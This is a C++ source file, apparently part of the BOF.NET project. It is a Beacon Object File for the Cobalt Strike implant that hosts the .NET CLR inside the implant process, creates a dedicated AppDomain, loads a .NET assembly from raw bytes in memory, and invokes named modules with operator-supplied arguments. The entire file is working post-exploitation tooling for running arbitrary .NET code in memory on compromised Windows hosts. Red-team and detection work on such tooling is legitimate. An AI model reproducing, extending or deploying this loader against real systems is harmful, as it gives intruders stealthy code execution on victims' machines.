
#define _USE_RAW
#include <initguid.h>
#include "utils.h"

extern "C"{
    #include "beacon.h"
}

#include <comutil.h>
#include <mscoree.h>
#include <initializer_list>

namespace mscorlib{
    #include "mscorlib.h"
}

__CRT_UUID_DECL(mscorlib::_AppDomain, 0x05F696DC, 0x2B29, 0x3663, 0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13);

const VARIANT vtEmpty{ {{VT_EMPTY, 0, 0, 0, {0}}}};
const VARIANT vtNull{ {{VT_NULL, 0, 0, 0, {0}}}};

#define MAX_BOF_NAME 512

mscorlib::_AppDomain* initBofNetDomain(ICorRuntimeHost* icrh){

    BOF_LOCAL(OLE32, CLSIDFromString);

    GUID CLSID_AppDomain;
    HRESULT hr;
    IUnknown* iu = nullptr;
    mscorlib::_AppDomain* appDomain = nullptr;
    CLSIDFromString(L"{05F696DC-2B29-3663-AD8B-C4389CF2A713}", &CLSID_AppDomain);

    hr = icrh->CreateDomain(L"BOFNET", nullptr, &iu);

    if(iu == nullptr){
        log("[!] Failed to create BOFNET AppDomain: 0x%x", hr);
        return nullptr;
    }

    hr = iu->QueryInterface(CLSID_AppDomain, (LPVOID*)&appDomain);

    if(appDomain == nullptr){
        log("[!] Failed to query BOFNET AppDomain interface: 0x%x", hr);
    }
    iu->Release();

    return appDomain;
}


mscorlib::_AppDomain* getBofNetDomain(ICorRuntimeHost* icrh){

    BOF_LOCAL(msvcrt, wcscmp);
    BOF_LOCAL(OLE32, CLSIDFromString);

    GUID CLSID_AppDomain;
    HRESULT hr;
    HDOMAINENUM hDomainEnum;
    IUnknown* iu = nullptr;
    mscorlib::_AppDomain* appDomain = nullptr;
    bool found = false;

    CLSIDFromString(L"{05F696DC-2B29-3663-AD8B-C4389CF2A713}", &CLSID_AppDomain);

    hr = icrh->EnumDomains(&hDomainEnum);

    while( (hr = icrh->NextDomain(hDomainEnum, &iu)) == S_OK){
        BSTR friendlyName;
        hr = iu->QueryInterface(CLSID_AppDomain, (LPVOID*)&appDomain);
        hr = appDomain->get_FriendlyName(&friendlyName);

        if(friendlyName && wcscmp(friendlyName, L"BOFNET") == 0){
            found = true;
            iu->Release();
            break;
        }
        iu->Release();
    }

    iu = nullptr;
    hr = icrh->CloseEnum(hDomainEnum);

    if(!found){
        appDomain = initBofNetDomain(icrh);
    }

    return appDomain;
}

SAFEARRAY* createVariantSafeArray(int numArgs, va_list argp){

    BOF_LOCAL(OleAut32, SafeArrayCreateVector);
    BOF_LOCAL(OleAut32, SafeArrayPutElement);
    HRESULT hr;

    SAFEARRAY* sa = SafeArrayCreateVector(VT_VARIANT, 0, numArgs);

    for(long idx=0; idx < numArgs; ++idx){
        if((hr = SafeArrayPutElement(sa, &idx, (void*)va_arg(argp, VARIANT*))) != S_OK){
            log("[!] Failed to add element to SAFEARRAY: 0x%x", hr);
        }
    }

    return sa;
}


SAFEARRAY* createVariantSafeArray(int numArgs, ...){

    va_list argp;
    va_start(argp, numArgs);
    SAFEARRAY* sa = createVariantSafeArray(numArgs,argp);
    va_end(argp);

    return sa;
}

VARIANT invokeStaticMethod(mscorlib::_Type* type, const BSTR method, int numArgs, ... ){

    BOF_LOCAL(OleAut32, SafeArrayDestroy);

    VARIANT result;
    va_list argp;
    va_start(argp, numArgs);
    SAFEARRAY* saArgs = createVariantSafeArray(numArgs, argp);
    va_end(argp);

    HRESULT hr = type->InvokeMember_3(method, static_cast<mscorlib::BindingFlags>(mscorlib::BindingFlags_InvokeMethod | mscorlib::BindingFlags_Static | mscorlib::BindingFlags_Public),
                                          nullptr, vtEmpty, saArgs, &result);

    if(hr != S_OK){
        log("Failed to invoke member 0x%x", hr);
    }

    SafeArrayDestroy(saArgs);
    return result;
}

mscorlib::_Assembly* loadAssembly(mscorlib::_AppDomain* appDomain, const char* data, int len){

    BOF_LOCAL(msvcrt, memcpy);
    BOF_LOCAL(OleAut32, SafeArrayCreate);
    BOF_LOCAL(OleAut32, SafeArrayDestroy);

    SAFEARRAYBOUND          sab;
    SAFEARRAY*              sa;
    mscorlib::_Assembly*    result = nullptr;
    HRESULT                 hr;

    sab.lLbound   = 0;
    sab.cElements = len;;
    sa = SafeArrayCreate(VT_UI1, 1, &sab);
    memcpy(sa->pvData, data, sab.cElements);

    hr = appDomain->Load_3(sa, &result);
    SafeArrayDestroy(sa);

    if(result == nullptr){
        log("[!] Failed to load BOFNET runtime assembly: 0x%x", hr);
    }

    return result;
}

void logConsole(char* msg, int len){
#ifdef _BOF_
    BeaconOutput(CALLBACK_OUTPUT_UTF8, msg, len);
#else
    printf(msg);
#endif
}

const char* skipWhitespace(const char* str){

    const char* result = str;

    while(*result == ' ' || *result == '\t' || *result =='\0'){
        result++;
    }
    return result;
}

VARIANT createVariantString(const char* str){

    BOF_LOCAL(msvcrt, calloc);
    BOF_LOCAL(OleAut32, SysAllocString);
    BOF_LOCAL(msvcrt, free);
    BOF_LOCAL(msvcrt, strlen);

    int wideLen = (strlen(str) * 2) + 2;
    wchar_t* strW = (wchar_t*)calloc(1, wideLen);
    toWideChar((char*)str, strW, wideLen);

    VARIANT result;
    result.vt = VT_BSTR;
    result.bstrVal = SysAllocString(strW);

    free(strW);
    return result;
}


extern "C" void go(char* args , int len) {

    BOF_LOCAL(msvcrt, strcmp);
    BOF_LOCAL(msvcrt, memcpy);
    BOF_LOCAL(msvcrt, strlen);
    BOF_LOCAL(OLE32, CoInitializeEx);
    BOF_LOCAL(OLE32, CoCreateInstance);
    BOF_LOCAL(OLE32, CLSIDFromString);
    BOF_LOCAL(OleAut32, SysAllocString);
    BOF_LOCAL(OleAut32, SafeArrayCreate);
    BOF_LOCAL(OleAut32, SafeArrayDestroy);

    GUID                    IID_RTH, CLSID_RTH;
    HRESULT                 hr;
    ICorRuntimeHost*        icrh = nullptr;
    mscorlib::_Assembly*    bofnetAssembly = nullptr;
    mscorlib::_Type*        bofnetInitalizerType = nullptr;
    char                    bofName[MAX_BOF_NAME];

    if(len == 0){
        log("[+] No arguments specified for bofnet_execute, don't know what to do!\n", 0);
        return;
    }

    msvcrt$sscanf_s(args, "%s", bofName, sizeof(bofName));

    CLSIDFromString(L"{cb2f6722-ab3a-11d2-9c40-00c04fa30a3e}", &IID_RTH);
    CLSIDFromString(L"{cb2f6723-ab3a-11d2-9c40-00c04fa30a3e}", &CLSID_RTH);

    hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    hr = CoCreateInstance(CLSID_RTH, nullptr, CLSCTX_ALL, IID_RTH,(LPVOID*)&icrh);
    hr = icrh->Start();

    mscorlib::_AppDomain* bofnetAppDomain = getBofNetDomain(icrh);

    if(bofnetAppDomain == nullptr){
        log("[!] Failed to get BOFNET app domain\n", 0);
        return;
    }

    if(strcmp(bofName, "BOFNET.Bofs.Initializer") == 0){

        hr = bofnetAppDomain->Load_2(SysAllocString(L"BOFNET"), &bofnetAssembly);

        if(bofnetAssembly == nullptr){
            int bofnetRuntimeOffset = strlen(bofName) + 1;
            int bofnetRuntimeSize = len - bofnetRuntimeOffset;

            if(bofnetRuntimeSize == 0){
                log("[!] No BOFNET runtime payload supplied, bailing!", 0);
                return;
            }

            bofnetAssembly = loadAssembly(bofnetAppDomain, args+bofnetRuntimeOffset, bofnetRuntimeSize);

            if(bofnetAssembly == nullptr){
                return;
            }

        }else{
           log("[=] Looks like the BOFNET runtime is already loaded, ignoring initialize request\n", 0);
           return;
        }
    }else if(strcmp(bofName, "BOFNET.Bofs.Shutdown") == 0){
        log("[+] Unloading BOFNET", 0);
        icrh->UnloadDomain(bofnetAppDomain);
        icrh->Stop();
        return;

    }else{

        hr = bofnetAppDomain->Load_2(SysAllocString(L"BOFNET"), &bofnetAssembly);

        if(bofnetAssembly == nullptr){
            log("Failed to get BOFNET assembly. Have you run BOFNET.Bofs.Initializer BOF yet? : 0x%x\n", hr);
            return;
        }
    }

    hr = bofnetAssembly->GetType_2(SysAllocString(L"BOFNET.Runtime"), &bofnetInitalizerType);

    if(bofnetInitalizerType == nullptr){
        log("Failed to get BOFNET.Runtime type: 0x%x\n", hr);
        return;
    }

    VARIANT callback;
    callback.vt = VT_I8;
    callback.llVal = reinterpret_cast<long long>(logConsole);

    VARIANT vBofName = createVariantString(bofName);
    int bofNameLen = strlen(bofName) + 1;
    int remainingDataLen = len-(bofNameLen);

    if(args[bofNameLen-1] != '\0' || remainingDataLen == 0){

        VARIANT cmdLine;

        if(remainingDataLen){
            cmdLine = createVariantString(skipWhitespace(args + strlen(bofName)));
        }
        else{
            cmdLine.vt = VT_BSTR;
            cmdLine.bstrVal = nullptr;
        }

        invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 3, &callback, &vBofName, &cmdLine);

    }else{

        VARIANT rawData;
        SAFEARRAYBOUND sab;

        sab.lLbound   = 0;
        sab.cElements = remainingDataLen;
        rawData.vt = VT_ARRAY |  VT_UI1;
        rawData.parray = SafeArrayCreate(VT_UI1, 1, &sab);
        memcpy(rawData.parray->pvData, args+bofNameLen, sab.cElements);

        invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 3, &callback, &vBofName, &rawData);

        SafeArrayDestroy(rawData.parray);
    }
}
